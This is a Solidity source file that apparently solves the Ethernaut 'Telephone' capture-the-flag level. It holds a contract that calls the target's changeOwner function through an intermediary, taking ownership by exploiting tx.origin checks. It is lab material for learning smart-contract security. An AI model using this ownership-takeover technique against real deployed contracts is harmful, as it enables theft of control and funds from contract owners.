// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackTelephone {

  Telephone public originalContract = Telephone("Your instance here");
  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function ownTelephone() public {
    originalContract.changeOwner(owner);
  }

}

contract Telephone {
  function changeOwner(address _owner) public {}
}
